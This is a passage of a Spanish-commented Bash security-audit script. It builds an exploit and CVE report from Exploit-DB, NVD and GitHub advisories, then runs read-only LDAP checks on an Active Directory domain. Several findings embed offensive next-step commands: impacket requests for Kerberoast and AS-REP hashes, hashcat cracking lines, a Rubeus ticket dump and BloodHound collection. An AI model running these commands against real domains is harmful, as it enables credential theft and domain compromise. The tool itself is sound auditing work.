    [[ $total_nvd -gt 0 ]] && ok "NVD: ${total_nvd} CVEs críticos del stack"

    # ════════════════════════════════════════════════════════════
    # PARTE 4: GITHUB ADVISORY DATABASE (GHSA) — paquetes
    # ════════════════════════════════════════════════════════════
    log "  [4/4] GitHub Advisory Database — paquetes del stack"

    # Ecosistema según framework
    local ghsa_ecosystem="" ghsa_pkg=""
    case "${INTEL_FRAMEWORK_BACKEND:-}" in
        laravel|symfony) ghsa_ecosystem="composer"; ghsa_pkg="${INTEL_FRAMEWORK_BACKEND}" ;;
        django|flask|fastapi) ghsa_ecosystem="pip"; ghsa_pkg="${INTEL_FRAMEWORK_BACKEND}" ;;
        rails) ghsa_ecosystem="rubygems"; ghsa_pkg="rails" ;;
        nestjs|express|nextjs) ghsa_ecosystem="npm"; ghsa_pkg="${INTEL_FRAMEWORK_BACKEND}" ;;
    esac
    [[ "$INTEL_CMS" == "wordpress" ]] && ghsa_ecosystem="composer" && ghsa_pkg="wordpress"
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " nodejs " ]] && [[ -z "$ghsa_ecosystem" ]] && \
        ghsa_ecosystem="npm" && ghsa_pkg="node"

    if [[ -n "$ghsa_ecosystem" ]]; then
        local ghsa_data
        ghsa_data=$(curl -skL --max-time 15 \
            "https://api.github.com/advisories?ecosystem=${ghsa_ecosystem}&per_page=10&sort=updated&type=reviewed" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            2>/dev/null)

        if [[ -n "$ghsa_data" ]]; then
            local ghsa_tmp="/tmp/ghsa_$$.txt"
            echo "$ghsa_data" | python3 - "$ghsa_pkg" << 'PYGHSA' > "$ghsa_tmp"
import json, sys
keyword = sys.argv[1].lower() if len(sys.argv) > 1 else ""
try:
    ads = json.loads(sys.stdin.read())
    if not isinstance(ads, list): ads = []
    for a in ads:
        ghsa_id  = a.get("ghsa_id","")
        sev      = a.get("severity","unknown")
        summary  = a.get("summary","")[:100]
        updated  = a.get("updated_at","")[:10]
        pkg_name = ""
        for vuln in a.get("vulnerabilities",[]):
            p = vuln.get("package",{}).get("name","")
            if p: pkg_name = p; break
        # Solo mostrar si es relevante al keyword
        if keyword in summary.lower() or keyword in pkg_name.lower() or keyword == "node":
            cvss = 0.0
            for id_obj in a.get("identifiers",[]):
                pass  # GHSA no siempre tiene CVSS directo
            print(f"{ghsa_id}\t{sev}\t{pkg_name}\t{summary}\t{updated}")
except:
    pass
PYGHSA

            while IFS=$'\t' read -r ghsa_id sev pkg_n summary updated; do
                [[ -z "$ghsa_id" ]] && continue
                local sev_color="#8b949e"
                [[ "$sev" == "critical" ]] && sev_color="#ff2d2d"
                [[ "$sev" == "high"     ]] && sev_color="#ff6b35"
                [[ "$sev" == "moderate" ]] && sev_color="#ffd23f"

                ghsa_html+="<tr>"
                ghsa_html+="<td><a href='https://github.com/advisories/${ghsa_id}' target='_blank' style='color:#c9d1d9;'>${ghsa_id}</a></td>"
                ghsa_html+="<td style='color:${sev_color};font-weight:bold;text-transform:uppercase;'>${sev}</td>"
                ghsa_html+="<td style='color:#58a6ff;font-size:12px;'>${ghsa_ecosystem}: ${pkg_n}</td>"
                ghsa_html+="<td style='font-size:12px;'>${summary}</td>"
                ghsa_html+="<td style='font-size:11px;color:#8b949e;'>${updated}</td>"
                ghsa_html+="</tr>"
                ((total_ghsa++))
                INTEL_GHSA_VULNS+=("${ghsa_id}|${sev}|${pkg_n}|${summary}")
            done < "$ghsa_tmp"
            rm -f "$ghsa_tmp"
            [[ $total_ghsa -gt 0 ]] && ok "GHSA: ${total_ghsa} advisories para ${ghsa_ecosystem}/${ghsa_pkg}"
        fi
    fi

    # ════════════════════════════════════════════════════════════
    # GENERAR HALLAZGO CONSOLIDADO EN EL REPORTE
    # ════════════════════════════════════════════════════════════
    local full_html=""
    full_html+="<div style='background:#161b22;border:1px solid #30363d;border-radius:8px;padding:14px;margin-bottom:14px;'>"
    full_html+="<span style='color:#8b949e;font-size:12px;'>Stack analizado: "
    full_html+="<b style='color:#58a6ff;'>${INTEL_TECHNOLOGIES[*]:-desconocido}</b>"
    [[ -n "$INTEL_CMS" ]] && full_html+=" | CMS: <b style='color:#3fb950;'>${INTEL_CMS}</b>"
    [[ -n "$INTEL_FRAMEWORK_BACKEND" ]] && full_html+=" | Framework: <b style='color:#3fb950;'>${INTEL_FRAMEWORK_BACKEND}</b>"
    full_html+=" | OS: <b>${INTEL_OS:-?}</b></span></div>"

    if [[ -n "$edb_html" ]]; then
        full_html+="<h4 style='color:#ff6b35;margin:14px 0 8px;'>💥 Exploit-DB — Exploits del Stack Detectado</h4>"
        full_html+="<div style='font-size:11px;color:#8b949e;margin-bottom:6px;'>"
        full_html+="🌐 = online/reciente &nbsp;|&nbsp; "
        full_html+="<span style='background:#3fb950;color:#000;padding:1px 5px;border-radius:3px;'>MSF</span> = módulo Metasploit disponible &nbsp;|&nbsp; "
        full_html+="<span style='background:#1f6feb;color:#fff;padding:1px 5px;border-radius:3px;'>✓ Verified</span> = exploit verificado</div>"
        full_html+="<table class='vuln-table'>"
        full_html+="<tr><th>EDB-ID</th><th>Título</th><th>Tipo</th><th>Plataforma</th><th>Fecha</th><th>Archivo</th></tr>"
        full_html+="${edb_html}</table>"
    fi

    if [[ -n "$nvd_html" ]]; then
        full_html+="<h4 style='color:#58a6ff;margin:16px 0 8px;'>🛡 NVD — CVEs Críticos (CVSS ≥ 9.0)</h4>"
        full_html+="<table class='vuln-table'>"
        full_html+="<tr><th>CVE-ID</th><th>CVSS</th><th>Tech</th><th>Descripción</th><th>Publicado</th><th>Exploit</th></tr>"
        full_html+="${nvd_html}</table>"
    fi

    if [[ -n "$ghsa_html" ]]; then
        full_html+="<h4 style='color:#3fb950;margin:16px 0 8px;'>📦 GitHub Advisory — Vulnerabilidades de Paquetes</h4>"
        full_html+="<table class='vuln-table'>"
        full_html+="<tr><th>GHSA-ID</th><th>Severidad</th><th>Paquete</th><th>Descripción</th><th>Actualizado</th></tr>"
        full_html+="${ghsa_html}</table>"
    fi

    if (( total_edb + total_nvd + total_ghsa > 0 )); then
        local total_all=$(( total_edb + total_nvd + total_ghsa ))
        add_finding "ALTO" \
            "Exploit Intelligence: ${total_edb} EDB · ${total_nvd} CVEs NVD · ${total_ghsa} GHSA" \
            "${full_html}" \
            "8.5" \
            "1) Verificar versión exacta instalada vs rango vulnerable de cada CVE. 2) Priorizar: CVSS≥9 primero, luego exploits verificados en EDB. 3) Revisar módulos Metasploit disponibles para validación. 4) Aplicar parches del proveedor." \
            "searchsploit -x EDB-ID (leer) | searchsploit -m EDB-ID (copiar) | msfconsole → use exploit/... | Ref: exploit-db.com · nvd.nist.gov · github.com/advisories"
    else
        add_finding "INFO" "Exploit Intelligence: Sin exploits confirmados" \
            "No se encontraron exploits automáticamente. Posibles causas: sin internet, stack no identificado, o versiones parcheadas." \
            "N/A" \
            "Actualizar: sudo searchsploit --update && sudo $0 --update" \
            "Manual: exploit-db.com/search?q=TECNOLOGIA | nvd.nist.gov | github.com/advisories"
    fi

    intel_log "Exploit Intel: EDB=${total_edb} NVD=${total_nvd} GHSA=${total_ghsa} Total=${total_edb+total_nvd+total_ghsa}"
    echo
}

# ─── BÚSQUEDA MANUAL EN EDB (INTERACTIVA) ───────────────────────
modulo_edb_search() {
    echo
    echo -ne "${C_YEL}  🔍 Buscar en Exploit-DB + NVD: ${C_RST}"
    read -r search_query
    [[ -z "$search_query" ]] && return

    log "Exploit-DB Search: '${search_query}'"

    # searchsploit local
    if command -v searchsploit >/dev/null 2>&1; then
        echo -e "\n${C_BLU}── Resultados locales (searchsploit): ──${C_RST}"
        searchsploit "$search_query" --colour 2>/dev/null | head -25
        echo -e "\n${C_DIM}  searchsploit -x EDB-ID → leer exploit"
        echo -e "  searchsploit -m EDB-ID → copiar exploit${C_RST}"
    fi

    # Links directos
    local q_enc
    q_enc=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${search_query}'))" 2>/dev/null || echo "$search_query")
    echo -e "\n${C_BLU}── Links de referencia: ──${C_RST}"
    echo -e "  ${C_YEL}EDB:${C_RST}  https://www.exploit-db.com/search?q=${q_enc}"
    echo -e "  ${C_YEL}NVD:${C_RST}  https://nvd.nist.gov/vuln/search/results?query=${q_enc}"
    echo -e "  ${C_YEL}GHSA:${C_RST} https://github.com/advisories?query=${q_enc}"
    echo -e "  ${C_YEL}MSF:${C_RST}  https://www.rapid7.com/db/?q=${q_enc}&type=metasploit"
    echo
}



# ════════════════════════════════════════════════════════════════
# ██████╗ ██████╗ ██████╗ ██╗   ██╗██╗     ███████╗███████╗
# ██╔══██╗██╔══██╗██╔══██╗██║   ██║██║     ██╔════╝██╔════╝
# ███████║██║  ██║██████╔╝██║   ██║██║     ███████╗█████╗  
# ██╔══██║██║  ██║██╔═══╝ ██║   ██║██║     ╚════██║██╔══╝  
# ██║  ██║██████╔╝██║     ╚██████╔╝███████╗███████║███████╗
# ╚═╝  ╚═╝╚═════╝ ╚═╝      ╚═════╝ ╚══════╝╚══════╝╚══════╝
# ADPulse — Active Directory Security Auditor (integrado en WriestTavo)
# 35 checks · LDAP solo lectura · Blue/Red Team · Pentesting Interno
# ════════════════════════════════════════════════════════════════

# ─── VARIABLES GLOBALES AD ──────────────────────────────────────
AD_DOMAIN=""
AD_DOMAIN_FQDN=""
AD_DC_IP=""
AD_BASE_DN=""
AD_USER=""
AD_PASS=""
AD_USER_FULL=""
AD_OUT_DIR=""
AD_CRITICAL=0; AD_HIGH=0; AD_MEDIUM=0; AD_LOW=0; AD_INFO=0
AD_KERBEROASTABLE=()
AD_ASREPROASTABLE=()
AD_ADCS_TEMPLATES=()
AD_UNCONSTRAINED=()
AD_DA_MEMBERS=()
AD_PASS_NEVER_EXPIRES=()
AD_INACTIVE_ACCOUNTS=()

# ─── HELPERS INTERNOS ───────────────────────────────────────────
_ad_finding() {
    # _ad_finding SEVERIDAD TÍTULO DETALLE CVSS REMEDIACIÓN NEXT_STEP
    local sev="$1" title="$2" detail="$3" cvss="${4:-N/A}"
    local rem="${5:-}" next="${6:-}"
    case "$sev" in
        CRÍTICO) ((AD_CRITICAL++)) ;;
        ALTO)    ((AD_HIGH++)) ;;
        MEDIO)   ((AD_MEDIUM++)) ;;
        BAJO)    ((AD_LOW++)) ;;
        *)       ((AD_INFO++)) ;;
    esac
    add_finding "$sev" "🏢 AD: ${title}" "$detail" "$cvss" "$rem" "$next"
}

_ad_log() { echo -e "  ${C_PUR}[ADPulse]${C_RST} $*"; }
_ad_ok()  { echo -e "  ${C_GRN}[✓]${C_RST} $*"; }
_ad_warn(){ echo -e "  ${C_YEL}[!]${C_RST} $*"; }
_ad_crit(){ echo -e "  ${C_RED}[💥]${C_RST} $*"; }

# LDAP autenticado
_ldap() {
    local filter="$1" attrs="${2:-*}"
    ldapsearch -x -LLL \
        -H "ldap://${AD_DC_IP}:389" \
        -D "${AD_USER_FULL}" \
        -w "${AD_PASS}" \
        -b "${AD_BASE_DN}" \
        -E pr=1000/noprompt \
        "$filter" $attrs 2>/dev/null
}

# LDAP por LDAPS (636)
_ldaps() {
    local filter="$1" attrs="${2:-*}"
    ldapsearch -x -LLL \
        -H "ldaps://${AD_DC_IP}:636" \
        -D "${AD_USER_FULL}" \
        -w "${AD_PASS}" \
        -b "${AD_BASE_DN}" \
        -E pr=1000/noprompt \
        "$filter" $attrs 2>/dev/null
}

# LDAP anónimo (null bind — verifica si está habilitado)
_ldap_anon() {
    local filter="$1" attrs="${2:-*}"
    ldapsearch -x -LLL \
        -H "ldap://${AD_DC_IP}:389" \
        -b "${AD_BASE_DN}" \
        "$filter" $attrs 2>/dev/null
}

# Wrapper impacket (soporta .py o sin extensión según distro)
_impacket() {
    local tool="$1"; shift
    local cmd=""
    command -v "${tool}.py" >/dev/null 2>&1 && cmd="${tool}.py"
    command -v "${tool}"    >/dev/null 2>&1 && [[ -z "$cmd" ]] && cmd="${tool}"
    [[ -z "$cmd" ]] && { echo "NOTFOUND"; return 1; }
    "$cmd" "$@" 2>/dev/null
}

# Convertir DN a FQDN: DC=corp,DC=local → corp.local
_dn_to_fqdn() {
    echo "$1" | grep -oP '(?<=DC=)[^,]+' | paste -sd '.' -
}

# ─── MÓDULO 45: ADPULSE — AUDITOR DE ACTIVE DIRECTORY ───────────
modulo_adpulse() {
    log "MÓDULO 45: ADPulse — Active Directory Security Auditor"
    tip "Requiere: ldapsearch + credenciales de dominio de solo lectura. No modifica el AD."

    # ── Verificar dependencias ───────────────────────────────────
    local deps_ok=true
    for dep in ldapsearch python3; do
        command -v "$dep" >/dev/null 2>&1 || {
            warn "Dependencia faltante: ${dep}"
            deps_ok=false
        }
    done
    if [[ "$deps_ok" == "false" ]]; then
        warn "Instalar: sudo apt install ldap-utils python3"
        return
    fi

    # ── Solicitar credenciales AD ────────────────────────────────
    echo
    echo -e "${C_PUR}  ╔════════════════════════════════════════════╗${C_RST}"
    echo -e "${C_PUR}  ║  ADPulse — Configuración de Conexión AD    ║${C_RST}"
    echo -e "${C_PUR}  ╚════════════════════════════════════════════╝${C_RST}"
    echo
    echo -e "  ${C_DIM}Requiere cuenta de solo lectura en el dominio.${C_RST}"
    echo -e "  ${C_DIM}Ejemplo: ldapuser / ReadOnly123!${C_RST}"
    echo

    # DC IP (autodetectar si ya tenemos TARGET)
    local default_dc="${TARGET}"
    echo -ne "  ${C_YEL}IP del Domain Controller${C_RST} [${default_dc}]: "
    read -r input_dc
    AD_DC_IP="${input_dc:-$default_dc}"

    echo -ne "  ${C_YEL}Dominio FQDN${C_RST} (ej: corp.local): "
    read -r input_domain
    AD_DOMAIN_FQDN=$(echo "${input_domain}" | tr '[:upper:]' '[:lower:]')
    AD_DOMAIN=$(echo "${input_domain}" | tr '[:lower:]' '[:upper:]')

    # Construir Base DN automáticamente
    AD_BASE_DN=$(echo "$AD_DOMAIN_FQDN" | awk -F'.' '{for(i=1;i<=NF;i++) printf "DC="$i(i<NF?",":""); print ""}')
    echo -e "  ${C_DIM}  Base DN detectado: ${AD_BASE_DN}${C_RST}"

    echo -ne "  ${C_YEL}Usuario${C_RST} (solo nombre, ej: ldapuser): "
    read -r input_user
    AD_USER="$input_user"
    AD_USER_FULL="${AD_DOMAIN}\\${AD_USER}"

    echo -ne "  ${C_YEL}Contraseña${C_RST}: "
    read -rs input_pass
    AD_PASS="$input_pass"
    echo

    # Opción: null bind anónimo
    echo -ne "  ${C_YEL}¿Probar también acceso anónimo (null bind)? [s/N]${C_RST}: "
    read -r do_anon
    local try_anon=false
    [[ "${do_anon,,}" =~ ^(s|si|yes|y)$ ]] && try_anon=true

    echo

    # ── Preparar directorio de salida ────────────────────────────
    AD_OUT_DIR="${OUTPUT_DIR}/active_directory"
    mkdir -p "$AD_OUT_DIR"

    echo "ADPulse Scan — $(date)" > "${AD_OUT_DIR}/adpulse_log.txt"
    echo "DC: ${AD_DC_IP} | Domain: ${AD_DOMAIN_FQDN} | User: ${AD_USER}" >> "${AD_OUT_DIR}/adpulse_log.txt"
    echo "─────────────────────────────────────────────────" >> "${AD_OUT_DIR}/adpulse_log.txt"

    # ── Test de conectividad LDAP ────────────────────────────────
    _ad_log "Probando conectividad LDAP con ${AD_DC_IP}:389..."
    local test_conn
    test_conn=$(ldapsearch -x -LLL \
        -H "ldap://${AD_DC_IP}:389" \
        -D "${AD_USER_FULL}" \
        -w "${AD_PASS}" \
        -b "${AD_BASE_DN}" \
        "(objectClass=domain)" dc 2>&1 | head -5)

    if echo "$test_conn" | grep -qi "result: 0\|dc:"; then
        _ad_ok "Conexión LDAP exitosa → ${AD_DOMAIN_FQDN}"
    elif echo "$test_conn" | grep -qi "invalid credentials\|49"; then
        _ad_warn "Credenciales incorrectas (código 49). Continuar con lo que se pueda."
    elif echo "$test_conn" | grep -qi "can't contact\|connection refused\|timed out"; then
        warn "No se puede conectar a ${AD_DC_IP}:389. Verificar IP y que LDAP esté activo."
        return
    else
        _ad_warn "Respuesta inesperada: ${test_conn:0:80}"
    fi

    echo
    echo -e "${C_PUR}  ═══ Iniciando 35 checks de seguridad AD ═══${C_RST}"
    echo

    # ════════════════════════════════════════════════════════════
    # CHECK 1: NULL BIND (acceso LDAP anónimo)
    # ════════════════════════════════════════════════════════════
    _ad_log "[01/35] Null Bind — Acceso LDAP anónimo"
    local anon_result
    anon_result=$(_ldap_anon "(objectClass=domain)" dc 2>&1 | head -5)
    if echo "$anon_result" | grep -qi "dc:"; then
        _ad_crit "Null bind HABILITADO — cualquiera puede enumerar el AD sin credenciales"
        _ad_finding "CRÍTICO" "Null Bind LDAP Habilitado" \
            "El servidor LDAP permite consultas anónimas sin autenticación. Un atacante puede enumerar usuarios, grupos, políticas y estructura del dominio sin ninguna credencial." \
            "9.1" \
            "Deshabilitar acceso anónimo LDAP: Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options → 'Network access: Allow anonymous SID/Name translation' = Disabled" \
            "ldapsearch -x -LLL -H ldap://${AD_DC_IP} -b '${AD_BASE_DN}' '(objectClass=user)' cn"
    else
        _ad_ok "Null bind deshabilitado (correcto)"
    fi

    # ════════════════════════════════════════════════════════════
    # CHECK 2: KERBEROASTING — SPNs en cuentas de usuario
    # ════════════════════════════════════════════════════════════
    _ad_log "[02/35] Kerberoasting — Cuentas con SPN"
    local spn_file="${AD_OUT_DIR}/kerberoastable.txt"
    local spn_data
    spn_data=$(_ldap "(& (servicePrincipalName=*)(objectClass=user)(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
        "cn servicePrincipalName sAMAccountName userAccountControl pwdLastSet" 2>/dev/null)

    echo "$spn_data" > "$spn_file"
    local spn_count
    spn_count=$(echo "$spn_data" | grep -c "^dn:" || echo 0)

    if (( spn_count > 0 )); then
        _ad_crit "Kerberoastable: ${spn_count} cuentas con SPN"
        local spn_html="<table class='vuln-table'><tr><th>Usuario</th><th>SPN</th><th>PwdLastSet</th></tr>"
        while IFS= read -r line; do
            if [[ "$line" =~ ^sAMAccountName:\ (.+) ]]; then
                local sam="${BASH_REMATCH[1]}"
                AD_KERBEROASTABLE+=("$sam")
            fi
            if [[ "$line" =~ ^servicePrincipalName:\ (.+) ]]; then
                spn_html+="<tr><td><b>${sam}</b></td><td>${BASH_REMATCH[1]}</td><td>—</td></tr>"
            fi
        done <<< "$spn_data"
        spn_html+="</table>"
        spn_html+="<br><b>Hashcat:</b> <code>hashcat -m 13100 kerberoast_hashes.txt rockyou.txt --force</code>"

        _ad_finding "CRÍTICO" "Kerberoasting: ${spn_count} Cuentas con SPN" \
            "${spn_html}" "9.0" \
            "Usar contraseñas >25 caracteres aleatorias en cuentas de servicio. Migrar a Managed Service Accounts (MSA) o Group Managed Service Accounts (gMSA). Auditar SPNs innecesarios." \
            "impacket-GetUserSPNs ${AD_DOMAIN_FQDN}/${AD_USER}:'${AD_PASS}' -dc-ip ${AD_DC_IP} -request -outputfile ${AD_OUT_DIR}/kerberoast.hashes"
    else
        _ad_ok "Sin cuentas Kerberoastables"
    fi

    # ════════════════════════════════════════════════════════════
    # CHECK 3: AS-REP ROASTING — cuentas sin preautenticación
    # ════════════════════════════════════════════════════════════
    _ad_log "[03/35] AS-REP Roasting — Sin preautenticación Kerberos"
    local asrep_data
    asrep_data=$(_ldap "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
        "cn sAMAccountName" 2>/dev/null)
    local asrep_count
    asrep_count=$(echo "$asrep_data" | grep -c "^dn:" || echo 0)

    if (( asrep_count > 0 )); then
        _ad_crit "AS-REP Roastable: ${asrep_count} cuentas sin preauth"
        local asrep_html="<p>Cuentas con <b>DONT_REQUIRE_PREAUTH</b> habilitado:</p><ul>"
        while IFS= read -r line; do
            [[ "$line" =~ ^sAMAccountName:\ (.+) ]] && {
                AD_ASREPROASTABLE+=("${BASH_REMATCH[1]}")
                asrep_html+="<li><code>${BASH_REMATCH[1]}</code></li>"
            }
        done <<< "$asrep_data"
        asrep_html+="</ul>"
        asrep_html+="<b>Hashcat:</b> <code>hashcat -m 18200 asrep_hashes.txt rockyou.txt</code>"

        _ad_finding "CRÍTICO" "AS-REP Roasting: ${asrep_count} Cuentas Vulnerables" \
            "$asrep_html" "9.0" \
            "Habilitar preautenticación Kerberos en todas las cuentas. Deshabilitar el atributo DONT_REQUIRE_PREAUTH a menos que sea estrictamente necesario." \
            "impacket-GetNPUsers ${AD_DOMAIN_FQDN}/ -usersfile ${AD_OUT_DIR}/users.txt -format hashcat -outputfile ${AD_OUT_DIR}/asrep.hashes -dc-ip ${AD_DC_IP}"
    else
        _ad_ok "Sin cuentas AS-REP Roastables"
    fi

    # ════════════════════════════════════════════════════════════
    # CHECK 4: UNCONSTRAINED DELEGATION
    # ════════════════════════════════════════════════════════════
    _ad_log "[04/35] Unconstrained Delegation"
    local unconstrained_data
    unconstrained_data=$(_ldap "(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(primaryGroupID=516))(!(primaryGroupID=521)))" \
        "cn sAMAccountName distinguishedName" 2>/dev/null)
    local unc_count
    unc_count=$(echo "$unconstrained_data" | grep -c "^dn:" || echo 0)

    if (( unc_count > 0 )); then
        _ad_crit "Delegación sin restricción en ${unc_count} objeto(s)"
        local unc_html="<p>Objetos con <b>TrustedForDelegation</b> (TRUSTED_FOR_DELEGATION):</p><ul>"
        while IFS= read -r line; do
            [[ "$line" =~ ^cn:\ (.+) ]] && {
                AD_UNCONSTRAINED+=("${BASH_REMATCH[1]}")
                unc_html+="<li><code>${BASH_REMATCH[1]}</code></li>"
            }
        done <<< "$unconstrained_data"
        unc_html+="</ul><p><b>Impacto:</b> Si se compromete este equipo, se pueden robar tickets TGT de cualquier usuario que se autentique en él, incluyendo Domain Admins.</p>"

        _ad_finding "CRÍTICO" "Unconstrained Delegation Habilitado" \
            "$unc_html" "9.5" \
            "Reemplazar con Constrained Delegation (msDS-AllowedToDelegateTo) o Resource-Based Constrained Delegation (RBCD). Nunca usar TrustedForDelegation excepto en DCs." \
            "rubeus.exe dump /service:krbtgt /nowrap  # desde el equipo comprometido con delegación"
    else
        _ad_ok "Sin Unconstrained Delegation (excepto DCs)"
    fi

    # ════════════════════════════════════════════════════════════
    # CHECK 5: CONSTRAINED DELEGATION con protocolo S4U2Self
    # ════════════════════════════════════════════════════════════
    _ad_log "[05/35] Constrained Delegation — S4U2Self/S4U2Proxy"
    local constrained_data
    constrained_data=$(_ldap "(msDS-AllowedToDelegateTo=*)" \
        "cn sAMAccountName msDS-AllowedToDelegateTo userAccountControl" 2>/dev/null)
    local con_count
    con_count=$(echo "$constrained_data" | grep -c "^dn:" || echo 0)

    if (( con_count > 0 )); then
        _ad_warn "Constrained Delegation configurado en ${con_count} objeto(s)"
        local con_html="<p>Objetos con Constrained Delegation (puede ser legítimo pero revisar):</p><ul>"
        while IFS= read -r line; do
            [[ "$line" =~ ^cn:\ (.+) ]] && con_html+="<li>${BASH_REMATCH[1]}</li>"
            [[ "$line" =~ ^msDS-AllowedToDelegateTo:\ (.+) ]] && con_html+="<li style='color:#8b949e;font-size:12px;'>→ ${BASH_REMATCH[1]}</li>"
        done <<< "$constrained_data"
        con_html+="</ul>"

        _ad_finding "MEDIO" "Constrained Delegation — Revisar Configuración" \
            "$con_html" "6.5" \
            "Revisar que los servicios configurados en msDS-AllowedToDelegateTo sean necesarios. Auditar si hay combinación con TRUSTED_TO_AUTH_FOR_DELEGATION (Protocol Transition)." \
            "impacket-findDelegation ${AD_DOMAIN_FQDN}/${AD_USER}:'${AD_PASS}' -dc-ip ${AD_DC_IP}"
    else
        _ad_ok "Constrained Delegation: configuración limpia"
    fi

    # ════════════════════════════════════════════════════════════
    # CHECK 6: CUENTAS DE DOMINIO ADMIN
    # ════════════════════════════════════════════════════════════
    _ad_log "[06/35] Miembros de grupos privilegiados"
    local priv_groups=("Domain Admins" "Enterprise Admins" "Schema Admins" "Administrators" "Account Operators" "Backup Operators")
    local priv_html="<table class='vuln-table'><tr><th>Grupo</th><th>Miembros</th></tr>"
    local total_priv=0

    for grp in "${priv_groups[@]}"; do
        local grp_data
        grp_data=$(_ldap "(&(objectClass=group)(cn=${grp}))" "member" 2>/dev/null)
        local members
        members=$(echo "$grp_data" | grep "^member:" | wc -l)
        ((total_priv += members))
        (( members > 0 )) && AD_DA_MEMBERS+=("${grp}: ${members} miembros")

        local color="#c9d1d9"
        [[ "$grp" == "Domain Admins" ]] && (( members > 5 )) && color="#ff6b35"
        [[ "$grp" == "Schema Admins" || "$grp" == "Enterprise Admins" ]] && (( members > 0 )) && color="#ff2d2d"

        priv_html+="<tr><td><b>${grp}</b></td><td style='color:${color};'>${members}</td></tr>"
    done
    priv_html+="</table>"
    priv_html+="<br><b>Regla:</b> Domain Admins ≤ 5, Schema Admins = 0 en prod, Enterprise Admins = 0 en prod."

    local priv_sev="INFO"
    (( total_priv > 20 )) && priv_sev="MEDIO"
    # Check if schema/enterprise admins have members
    echo "${AD_DA_MEMBERS[@]}" | grep -qE "Schema Admins: [^0]|Enterprise Admins: [^0]" && priv_sev="ALTO"

    _ad_finding "$priv_sev" "Grupos Privilegiados — ${total_priv} Miembros Totales" \
        "$priv_html" "7.0" \
        "Aplicar principio de mínimo privilegio. Domain Admins: máximo 5 cuentas. Schema/Enterprise Admins: vacíos en operación normal. Usar tier model (Tier 0/1/2)." \
        "net group 'Domain Admins' /domain | Alternativa: bloodhound-python -u USER -p PASS -d DOMAIN -c All"

    # ════════════════════════════════════════════════════════════
    # CHECK 7: KRBTGT PASSWORD AGE (Golden Ticket prevention)
    # ════════════════════════════════════════════════════════════
    _ad_log "[07/35] KRBTGT — Edad de contraseña"
    local krbtgt_data
    krbtgt_data=$(_ldap "(cn=krbtgt)" "pwdLastSet whenCreated" 2>/dev/null)
    local krbtgt_pwdset
    krbtgt_pwdset=$(echo "$krbtgt_data" | grep "^pwdLastSet:" | awk '{print $2}')

    if [[ -n "$krbtgt_pwdset" ]] && (( krbtgt_pwdset > 0 )); then
        # Convertir Windows FileTime a Unix timestamp
        local krbtgt_age_days
        krbtgt_age_days=$(python3 -c "
import datetime
ft = ${krbtgt_pwdset}
unix_ts = (ft - 116444736000000000) // 10000000
dt = datetime.datetime.utcfromtimestamp(unix_ts)
now = datetime.datetime.utcnow()
print((now - dt).days)
" 2>/dev/null || echo "999")

        if (( krbtgt_age_days > 180 )); then
            _ad_crit "KRBTGT password tiene ${krbtgt_age_days} días (>180) — Golden Ticket risk"
            _ad_finding "CRÍTICO" "KRBTGT Password Antigua (${krbtgt_age_days} días)" \
                "<p>La cuenta <b>krbtgt</b> no ha cambiado su contraseña en <b>${krbtgt_age_days} días</b>. Si esta contraseña fue comprometida (Golden Ticket), el atacante mantiene persistencia perpetua.</p>
                <p><b>NIST recomienda:</b> Cambiar krbtgt cada 180 días máximo.</p>
                <p><b>⚠ Procedimiento:</b> La contraseña debe cambiarse TWICE con intervalo de 10h entre cambios para invalidar todos los tickets.</p>" \
                "9.8" \
                "Cambiar contraseña krbtgt DOS VECES con 10 horas de intervalo usando Microsoft's New-KrbtgtKeys.ps1 script." \
                "Invoke-ADServiceAccountPasswordReset -AccountName krbtgt | O usar: Reset-KrbtgtKeyInteractively.ps1"
        elif (( krbtgt_age_days > 90 )); then
            _ad_warn "KRBTGT: ${krbtgt_age_days} días (recomendado <90)"
            _ad_finding "ALTO" "KRBTGT Password — ${krbtgt_age_days} días sin cambio" \
                "<p>Recomendado cambiar cada 90 días para reducir ventana de Golden Ticket.</p>" \
                "7.5" \
                "Cambiar krbtgt password dos veces con intervalo de 10 horas." \
                "New-KrbtgtKeys.ps1 -Mode ResetNow -Domain ${AD_DOMAIN_FQDN}"
        else
            _ad_ok "KRBTGT password: ${krbtgt_age_days} días (OK)"
        fi
    fi

    # ════════════════════════════════════════════════════════════
    # CHECK 8: CONTRASEÑAS QUE NUNCA EXPIRAN
    # ════════════════════════════════════════════════════════════
    _ad_log "[08/35] Cuentas con contraseñas que nunca expiran"
    local noexp_data
    noexp_data=$(_ldap "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
        "cn sAMAccountName" 2>/dev/null)
    local noexp_count
    noexp_count=$(echo "$noexp_data" | grep -c "^dn:" || echo 0)

    if (( noexp_count > 0 )); then
        _ad_warn "${noexp_count} cuentas con DONT_EXPIRE_PASSWORD"
        local noexp_html="<p><b>${noexp_count} cuentas</b> activas con contraseña configurada para no expirar nunca:</p><ul>"
        while IFS= read -r line; do
            [[ "$line" =~ ^sAMAccountName:\ (.+) ]] && {
                AD_PASS_NEVER_EXPIRES+=("${BASH_REMATCH[1]}")
                noexp_html+="<li><code>${BASH_REMATCH[1]}</code></li>"
            }
        done <<< "$noexp_data"
        noexp_html+="</ul>"

        local ne_sev="BAJO"
        (( noexp_count > 50 )) && ne_sev="MEDIO"
        (( noexp_count > 200 )) && ne_sev="ALTO"

        _ad_finding "$ne_sev" "Contraseñas Sin Expiración — ${noexp_count} Cuentas" \
            "$noexp_html" "5.0" \
            "Aplicar política de expiración de contraseñas. Cuentas de servicio → usar gMSA. Usuarios → máximo 90-180 días según política." \
            "Get-ADUser -Filter {PasswordNeverExpires -eq \$true -and Enabled -eq \$true} | Select Name"
    else
        _ad_ok "Sin cuentas con contraseñas sin expiración"
    fi

    # ════════════════════════════════════════════════════════════
    # CHECK 9: CUENTAS INACTIVAS CON ACCESO
    # ════════════════════════════════════════════════════════════
    _ad_log "[09/35] Cuentas inactivas (sin logon >90 días)"
    local inactive_data
    # Calcular timestamp de 90 días atrás en formato LDAP
    local ninety_days_ago
    ninety_days_ago=$(python3 -c "
import datetime
